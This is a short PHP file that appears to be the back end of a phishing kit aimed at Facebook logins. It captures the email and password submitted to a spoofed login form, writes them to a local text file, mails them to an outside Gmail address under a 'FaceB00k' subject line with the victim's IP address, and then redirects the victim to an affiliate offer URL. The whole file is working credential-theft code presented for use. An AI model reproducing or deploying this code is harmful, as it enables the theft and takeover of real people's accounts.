<?php

$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "xxx+ Moka +xxx\n";
$message .= "user: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['pass']."\n";
$rnessage = "$message\n";
$send= "mokamoamen96@gmail.com";
$subject = "FaceB00k| $ip";
$headers = "From: FaceB00k";
$file = fopen("Tunisi.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://www.ports.rocks/offer/172619|23233?data1=Track1&data2=Track2&website={subID}&placement={sub_subID}");

?>